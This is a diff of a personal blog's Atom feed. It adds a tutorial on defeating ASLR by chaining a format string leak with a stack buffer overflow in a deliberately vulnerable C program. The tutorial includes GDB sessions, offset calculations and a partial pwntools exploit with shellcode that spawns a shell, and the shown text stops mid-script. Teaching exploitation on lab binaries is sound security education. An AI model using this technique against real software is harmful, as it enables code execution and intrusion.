@@ -1,4 +1,264 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-10-25T11:34:35-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Nihaal Prasad</title><subtitle></subtitle><entry><title type="html">Mining Hero Vulnerabilities</title><link href="http://localhost:4000/2020/10/25/mining-hero-vulnerabilities.html" rel="alternate" type="text/html" title="Mining Hero Vulnerabilities" /><published>2020-10-25T00:00:00-04:00</published><updated>2020-10-25T00:00:00-04:00</updated><id>http://localhost:4000/2020/10/25/mining-hero-vulnerabilities</id><content type="html" xml:base="http://localhost:4000/2020/10/25/mining-hero-vulnerabilities.html">&lt;p&gt;&lt;a href=&quot;../../../assets/other/2020-10-25-mining-hero-vulnerabilities/text-game.cpp&quot;&gt;Mining Hero&lt;/a&gt; (click &lt;a href=&quot;../../../assets/other/2020-10-25-mining-hero-vulnerabilities/text-game&quot;&gt;here&lt;/a&gt; for the binary) is a CTF problem I solved when I played in MetaCTF over this weekend. It involves chaining an integer overflow vulnerability with a format string vulnerability in order to obtain the flag. This is my writeup for how I exploited the binary.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-12-30T11:32:57-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Nihaal Prasad</title><subtitle></subtitle><entry><title type="html">Defeating ASLR via Memory Leak</title><link href="http://localhost:4000/2020/12/29/defeating-aslr-via-memory-leak.html" rel="alternate" type="text/html" title="Defeating ASLR via Memory Leak" /><published>2020-12-29T00:00:00-05:00</published><updated>2020-12-29T00:00:00-05:00</updated><id>http://localhost:4000/2020/12/29/defeating-aslr-via-memory-leak</id><content type="html" xml:base="http://localhost:4000/2020/12/29/defeating-aslr-via-memory-leak.html">&lt;p&gt;Address Space Layout Randomization (ASLR) is a modern exploit mitigation technique that Operating Systems typically use to randomize addresses when a process is executed. This is implemented by having the OS change the locations of special areas, such as the base of executable, the heap, the stack, and any libraries that are loaded in memory. Since memory addresses are unpredictable when ASLR is turned on, hardcoded addresses can no longer be used in exploits when ASLR is enabled.&lt;/p&gt;
+
+&lt;p&gt;Sometimes, if there is a poor implementation of ASLR, the addresses may not be very random (ex. only a byte or two actually change when the program is executed). In other cases, one might try to exploit a partial overwrite, which means that there are only a few unknown bytes of the address. In both of these cases, it may be possible to brute force all the possible addresses in our exploit. However, brute forcing is infeasible if the address space is properly randomized, so this blog post is going to be focused on using a more reliable method of bypassing ASLR: leaking memory addresses.&lt;/p&gt;
+
+&lt;p&gt;One thing to note about ASLR is that it does not change offsets. That is, if during one instance of a process, there was a variable that was located at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00001000&lt;/code&gt; and a second variable that was located at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00001010&lt;/code&gt; in the same library, then the second variable will always be &lt;code class=&quot;highlighter-rouge&quot;&gt;0x10&lt;/code&gt; bytes away from the first variable no matter what. If ASLR changes the first variable’s location to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00001234&lt;/code&gt; while executing the program again, then the second variable must be at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00001244&lt;/code&gt; because it must remain &lt;code class=&quot;highlighter-rouge&quot;&gt;0x10&lt;/code&gt; bytes away from the first variable.&lt;/p&gt;
+
+&lt;p&gt;Because offsets remain the same, if an attacker can leak just one address from the program, the attacker will be able to use that one address to calculate any other addresses in the same memory mapping by adding or subtracting some constant offset. An attacker could then write an exploit that leaks an address off of the stack (using something like a format string vulnerability), use the leaked address to figure out the address of some shellcode, and exploit a buffer overflow to overwrite the return address with the calculated address of the shellcode. Since the offset does not change, this exploit should work in all instances.&lt;/p&gt;
+
+&lt;p&gt;This is the C program that will be exploited:&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// Compilation: gcc -o buffers -fno-stack-protector -z execstack buffers.c&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter your input for the first buffer (fmt str vuln): &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter your input for the second buffer (stack overflow): &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;300&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Assume that NX and stack canaries are disabled. The &lt;code class=&quot;highlighter-rouge&quot;&gt;printf(buf1)&lt;/code&gt; call is clearly vulnerable to a format string exploit since the user controls what’s in &lt;code class=&quot;highlighter-rouge&quot;&gt;buf1&lt;/code&gt;. The &lt;code class=&quot;highlighter-rouge&quot;&gt;fgets(buf2, 300, stdin)&lt;/code&gt; is vulnerable to a stack buffer overflow because it is trying to read 300 bytes of data into a 100 byte buffer. After doing some poking around, one can see that the return address is located 232 bytes into the second buffer.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python3 -c &quot;print('A\n'+'A'*232+'BBBBBBBB')&quot; &amp;gt; test                                                    130 ⨯
+$ ./buffers &amp;lt; test
+Enter your input for the first buffer (fmt str vuln): A
+zsh: segmentation fault  ./buffers &amp;lt; test
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As proof, here is what this looks like in GDB. Note that the return address on the stack has been overwritten with B’s after 232 bytes have been written to the second buffer.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gdb buffers                                                                                            139 ⨯
+GNU gdb (Debian 10.1-1.4) 10.1
+Copyright (C) 2020 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type &quot;show copying&quot; and &quot;show warranty&quot; for details.
+This GDB was configured as &quot;x86_64-linux-gnu&quot;.
+Type &quot;show configuration&quot; for configuration details.
+For bug reporting instructions, please see:
+&amp;lt;https://www.gnu.org/software/gdb/bugs/&amp;gt;.
+Find the GDB manual and other documentation resources online at:
+    &amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.
+
+For help, type &quot;help&quot;.
+Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...
+GEF for linux ready, type `gef' to start, `gef config' to configure
+76 commands loaded for GDB 10.1 using Python engine 3.9
+[*] 4 commands could not be loaded, run `gef missing` to know why.
+Reading symbols from buffers...
+(No debugging symbols found in buffers)
+gef➤  r &amp;lt; test
+Starting program: /home/nihaal/Desktop/buffers &amp;lt; test
+Enter your input for the first buffer (fmt str vuln): A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00005555555552bb in main ()
+[ Legend: Modified register | Code | Heap | Stack | String ]
+────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0
+$rbx   : 0x0
+$rcx   : 0x00005555555597a3  →  0x0000000000000000
+$rdx   : 0x0
+$rsp   : 0x00007fffffffe028  →  &quot;BBBBBBBB\n&quot;
+$rbp   : 0x4141414141414141 (&quot;AAAAAAAA&quot;?)
+$rsi   : 0x00005555555596b2  →  &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;
+$rdi   : 0x00007ffff7fb0680  →  0x0000000000000000
+$rip   : 0x00005555555552bb  →  &amp;lt;main+374&amp;gt; ret
+$r8    : 0x00007fffffffdf40  →  &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;
+$r9    : 0x0
+$r10   : 0x0000555555556040  →  &quot;Enter your input for the second buffer (stack over[...]&quot;
+$r11   : 0x246
+$r12   : 0x0000555555555060  →  &amp;lt;_start+0&amp;gt; xor ebp, ebp
+$r13   : 0x0
+$r14   : 0x0
+$r15   : 0x0
+$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
+────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffe028│+0x0000: &quot;BBBBBBBB\n&quot;         ← $rsp
+0x00007fffffffe030│+0x0008: 0x00007fffffff000a  →  0x0000000000000000
+0x00007fffffffe038│+0x0010: 0x0000000100000000
+0x00007fffffffe040│+0x0018: 0x0000555555555145  →  &amp;lt;main+0&amp;gt; push rbp
+0x00007fffffffe048│+0x0020: 0x00007ffff7e157cf  →  &amp;lt;init_cacheinfo+287&amp;gt; mov rbp, rax
+0x00007fffffffe050│+0x0028: 0x0000000000000000
+0x00007fffffffe058│+0x0030: 0x852cdd6ab588b454
+0x00007fffffffe060│+0x0038: 0x0000555555555060  →  &amp;lt;_start+0&amp;gt; xor ebp, ebp
+──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x5555555552b0 &amp;lt;main+363&amp;gt;       call   0x555555555040 &amp;lt;fgets@plt&amp;gt;
+   0x5555555552b5 &amp;lt;main+368&amp;gt;       mov    eax, 0x0
+   0x5555555552ba &amp;lt;main+373&amp;gt;       leave
+ → 0x5555555552bb &amp;lt;main+374&amp;gt;       ret
+[!] Cannot disassemble from $PC
+──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;buffers&quot;, stopped 0x5555555552bb in main (), reason: SIGSEGV
+────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x5555555552bb → main()
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  info frame
+Stack level 0, frame at 0x7fffffffe028:
+ rip = 0x5555555552bb in main; saved rip = 0x4242424242424242
+ Arglist at 0x4141414141414141, args:
+ Locals at 0x4141414141414141, Previous frame's sp is 0x7fffffffe030
+ Saved registers:
+  rip at 0x7fffffffe028
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This is what the &lt;code class=&quot;highlighter-rouge&quot;&gt;main()&lt;/code&gt; function looks like:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  disas main
+Dump of assembler code for function main:
+   0x0000555555555145 &amp;lt;+0&amp;gt;:     push   rbp
+   0x0000555555555146 &amp;lt;+1&amp;gt;:     mov    rbp,rsp
+   0x0000555555555149 &amp;lt;+4&amp;gt;:     sub    rsp,0xf0
+   0x0000555555555150 &amp;lt;+11&amp;gt;:    mov    DWORD PTR [rbp-0xe4],edi
+   0x0000555555555156 &amp;lt;+17&amp;gt;:    mov    QWORD PTR [rbp-0xf0],rsi
+   0x000055555555515d &amp;lt;+24&amp;gt;:    mov    QWORD PTR [rbp-0x70],0x0
+   0x0000555555555165 &amp;lt;+32&amp;gt;:    mov    QWORD PTR [rbp-0x68],0x0
+   0x000055555555516d &amp;lt;+40&amp;gt;:    mov    QWORD PTR [rbp-0x60],0x0
+   0x0000555555555175 &amp;lt;+48&amp;gt;:    mov    QWORD PTR [rbp-0x58],0x0
+   0x000055555555517d &amp;lt;+56&amp;gt;:    mov    QWORD PTR [rbp-0x50],0x0
+   0x0000555555555185 &amp;lt;+64&amp;gt;:    mov    QWORD PTR [rbp-0x48],0x0
+   0x000055555555518d &amp;lt;+72&amp;gt;:    mov    QWORD PTR [rbp-0x40],0x0
+   0x0000555555555195 &amp;lt;+80&amp;gt;:    mov    QWORD PTR [rbp-0x38],0x0
+   0x000055555555519d &amp;lt;+88&amp;gt;:    mov    QWORD PTR [rbp-0x30],0x0
+   0x00005555555551a5 &amp;lt;+96&amp;gt;:    mov    QWORD PTR [rbp-0x28],0x0
+   0x00005555555551ad &amp;lt;+104&amp;gt;:   mov    QWORD PTR [rbp-0x20],0x0
+   0x00005555555551b5 &amp;lt;+112&amp;gt;:   mov    QWORD PTR [rbp-0x18],0x0
+   0x00005555555551bd &amp;lt;+120&amp;gt;:   mov    DWORD PTR [rbp-0x10],0x0
+   0x00005555555551c4 &amp;lt;+127&amp;gt;:   mov    QWORD PTR [rbp-0xe0],0x0
+   0x00005555555551cf &amp;lt;+138&amp;gt;:   mov    QWORD PTR [rbp-0xd8],0x0
+   0x00005555555551da &amp;lt;+149&amp;gt;:   mov    QWORD PTR [rbp-0xd0],0x0
+   0x00005555555551e5 &amp;lt;+160&amp;gt;:   mov    QWORD PTR [rbp-0xc8],0x0
+   0x00005555555551f0 &amp;lt;+171&amp;gt;:   mov    QWORD PTR [rbp-0xc0],0x0
+   0x00005555555551fb &amp;lt;+182&amp;gt;:   mov    QWORD PTR [rbp-0xb8],0x0
+   0x0000555555555206 &amp;lt;+193&amp;gt;:   mov    QWORD PTR [rbp-0xb0],0x0
+   0x0000555555555211 &amp;lt;+204&amp;gt;:   mov    QWORD PTR [rbp-0xa8],0x0
+   0x000055555555521c &amp;lt;+215&amp;gt;:   mov    QWORD PTR [rbp-0xa0],0x0
+   0x0000555555555227 &amp;lt;+226&amp;gt;:   mov    QWORD PTR [rbp-0x98],0x0
+   0x0000555555555232 &amp;lt;+237&amp;gt;:   mov    QWORD PTR [rbp-0x90],0x0
+   0x000055555555523d &amp;lt;+248&amp;gt;:   mov    QWORD PTR [rbp-0x88],0x0
+   0x0000555555555248 &amp;lt;+259&amp;gt;:   mov    DWORD PTR [rbp-0x80],0x0
+   0x000055555555524f &amp;lt;+266&amp;gt;:   lea    rdi,[rip+0xdb2]        # 0x555555556008
+   0x0000555555555256 &amp;lt;+273&amp;gt;:   mov    eax,0x0
+   0x000055555555525b &amp;lt;+278&amp;gt;:   call   0x555555555030 &amp;lt;printf@plt&amp;gt;
+   0x0000555555555260 &amp;lt;+283&amp;gt;:   mov    rdx,QWORD PTR [rip+0x2dd9]        # 0x555555558040 &amp;lt;stdin@@GLIBC_2.2.5&amp;gt;
+   0x0000555555555267 &amp;lt;+290&amp;gt;:   lea    rax,[rbp-0x70]
+   0x000055555555526b &amp;lt;+294&amp;gt;:   mov    esi,0x64
+   0x0000555555555270 &amp;lt;+299&amp;gt;:   mov    rdi,rax
+   0x0000555555555273 &amp;lt;+302&amp;gt;:   call   0x555555555040 &amp;lt;fgets@plt&amp;gt;
+   0x0000555555555278 &amp;lt;+307&amp;gt;:   lea    rax,[rbp-0x70]
+   0x000055555555527c &amp;lt;+311&amp;gt;:   mov    rdi,rax
+   0x000055555555527f &amp;lt;+314&amp;gt;:   mov    eax,0x0
+   0x0000555555555284 &amp;lt;+319&amp;gt;:   call   0x555555555030 &amp;lt;printf@plt&amp;gt;
+   0x0000555555555289 &amp;lt;+324&amp;gt;:   lea    rdi,[rip+0xdb0]        # 0x555555556040
+   0x0000555555555290 &amp;lt;+331&amp;gt;:   mov    eax,0x0
+   0x0000555555555295 &amp;lt;+336&amp;gt;:   call   0x555555555030 &amp;lt;printf@plt&amp;gt;
+   0x000055555555529a &amp;lt;+341&amp;gt;:   mov    rdx,QWORD PTR [rip+0x2d9f]        # 0x555555558040 &amp;lt;stdin@@GLIBC_2.2.5&amp;gt;
+   0x00005555555552a1 &amp;lt;+348&amp;gt;:   lea    rax,[rbp-0xe0]
+   0x00005555555552a8 &amp;lt;+355&amp;gt;:   mov    esi,0x12c
+   0x00005555555552ad &amp;lt;+360&amp;gt;:   mov    rdi,rax
+   0x00005555555552b0 &amp;lt;+363&amp;gt;:   call   0x555555555040 &amp;lt;fgets@plt&amp;gt;
+   0x00005555555552b5 &amp;lt;+368&amp;gt;:   mov    eax,0x0
+   0x00005555555552ba &amp;lt;+373&amp;gt;:   leave
+=&amp;gt; 0x00005555555552bb &amp;lt;+374&amp;gt;:   ret
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Before writing the exploit, an attaker needs to look at the memory addresses that can be leaked off of the stack from the format string vulnerability and discover their offsets from the address that contains the shellcode. In this example, one can set a breakpoint at *main+368 (right after the second call to &lt;code class=&quot;highlighter-rouge&quot;&gt;fgets()&lt;/code&gt;), exploit the format string vulnerability to print out addresses off of the stack, and look at the addresses. The goal here is to find the start of the second buffer and a suitable address leaked off of the stack. Subtracting these two addresses will result in obtaining the offset that is required for the exploit.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  b *main+368
+Breakpoint 2 at 0x12b5
+gef➤  r
+Starting program: /home/nihaal/Desktop/buffers
+Enter your input for the first buffer (fmt str vuln): %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
+0x5555555596b1.(nil).0x5555555596cf.0x7fffffffdfb0.0x7ffff7fadbe0.0x7fffffffe118.0x100000000.(nil).(nil).(nil).
+Enter your input for the second buffer (stack overflow): AAAAAAAAAAAAAAAAAAAAAA
+
+Breakpoint 2, 0x00005555555552b5 in main ()
+[ Legend: Modified register | Code | Heap | Stack | String ]
+────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x00007fffffffdf40  →  &quot;AAAAAAAAAAAAAAAAAAAAAA\n&quot;
+$rbx   : 0x0
+$rcx   : 0x00005555555596c7  →  &quot;.%p.%p.\n&quot;
+$rdx   : 0x0
+$rsp   : 0x00007fffffffdf30  →  0x00007fffffffe118  →  0x00007fffffffe42f  →  &quot;/home/nihaal/Desktop/buffers&quot;
+$rbp   : 0x00007fffffffe020  →  0x00005555555552c0  →  &amp;lt;__libc_csu_init+0&amp;gt; push r15
+$rsi   : 0x00005555555596b1  →  &quot;AAAAAAAAAAAAAAAAAAAAA\n.%p.%p.\n&quot;
+$rdi   : 0x00007ffff7fb0680  →  0x0000000000000000
+$rip   : 0x00005555555552b5  →  &amp;lt;main+368&amp;gt; mov eax, 0x0
+$r8    : 0x00007fffffffdf40  →  &quot;AAAAAAAAAAAAAAAAAAAAAA\n&quot;
+$r9    : 0x0
+$r10   : 0x0000555555556040  →  &quot;Enter your input for the second buffer (stack over[...]&quot;
+$r11   : 0x246
+$r12   : 0x0000555555555060  →  &amp;lt;_start+0&amp;gt; xor ebp, ebp
+$r13   : 0x0
+$r14   : 0x0
+$r15   : 0x0
+$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As one can see above, the fourth value printed out from the stack when exploiting the format string vulnerability is &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7fffffffdfb0&lt;/code&gt; in this instance of the process. The second buffer, which is currently in &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt;, starts at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00007fffffffdf40&lt;/code&gt; in the same instance. This means that the fourth value printed out from the format string vulnerability is always going to have an offset of &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7fffffffdfb0 - 0x00007fffffffdf40 = 112&lt;/code&gt; bytes. In other words, subtracting 112 bytes from the fourth pointer on the stack will result in the address of the second buffer, which is where the shellcode will be injected.&lt;/p&gt;
+
+&lt;p&gt;Now that the offset is known, it is simple to write a program that exploits the buffer overflow using this calculated address. The only difference between this buffer overflow and a buffer overflow with ASLR turned off is that this buffer overflow does not use a hardcoded address. Instead, this exploit will calculate the address of the shellcode on the spot using the information that was leaked earlier.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Open up the process
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./buffers&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PTY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Ignore the first part
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Leak the fourth pointer from the stack
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%4%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# This will directly print out the fourth pointer
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Calculate the address of the buffer that will contain the shellcode
+# It should be 112 bytes away from the leaked address
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;112&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Generate the shellcode
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x48\x81\xec\x2c\x01\x00\x00\x48\x31\xc0\x48\x31\xff\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xdb\x53\xbb\x6e\x2f\x73\x68\x48\xc1\xe3\x10\x66\xbb\x62\x69\x48\xc1\xe3\x10\xb7\x2f\x53\x48\x89\xe7\x48\x83\xc7\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;nops&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;232&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
